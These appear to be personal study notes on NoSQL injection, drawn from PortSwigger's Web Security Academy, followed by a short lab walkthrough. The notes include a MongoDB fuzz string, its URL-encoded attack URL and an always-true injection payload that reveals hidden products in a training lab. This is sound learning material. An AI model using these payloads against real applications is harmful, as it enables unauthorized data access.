# NoSQL injection


<details>
  <summary>NoSqli</summary>

NoSQL injection
===============

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:

-   Bypass authentication or protection mechanisms.
-   Extract or edit data.
-   Cause a denial of service.
-   Execute code on the server.

NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languages instead of a universal standard like SQL, and have fewer relational constraints.

![image](https://portswigger.net/web-security/nosql-injection/images/nosql-injection-graphic.svg)


Types of NoSQL injection
------------------------

There are two different types of NoSQL injection:

-   **`Syntax injection`** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
-   **`Operator injection`** - This occurs when you can use NoSQL query operators to manipulate queries.

In this topic, we'll look at how to test for NoSQL vulnerabilities in general, then focus on exploiting vulnerabilities in MongoDB, which is the most popular NoSQL database. We've also provided some labs so you can practice what you've learned.


### Detecting syntax injection in MongoDB

Consider a shopping application that displays products in different categories. When the user selects the **Fizzy drinks** category, their browser requests the following URL:

`https://insecure-website.com/product/lookup?category=fizzy`

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

`this.category == 'fizzy'`

To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter. An example string for MongoDB is:

```
'"`{
;$Foo}
$Foo \xYZ
```

Use this fuzz string to construct the following attack:

`https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.


































  
</details>








---
---

# **`Labs`**

<details>
  <summary>Lab: Detecting NoSQL injection</summary>

1. select any catiegory

```url
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets
```


<img width="1657" height="877" alt="image" src="https://github.com/user-attachments/assets/34721e9d-6fad-49de-b037-f951e844b120" />

2. try to break the syntax

```
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets'
```

<img width="1514" height="479" alt="image" src="https://github.com/user-attachments/assets/fa2a0f56-3e5b-4923-b73e-d8a9ffb1ebff" />


3. show unreleased products

```
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets'||1||'
```

<img width="1585" height="861" alt="image" src="https://github.com/user-attachments/assets/31142bf0-0ab5-4c14-a6fd-f4712e934ab4" />



  
</details>













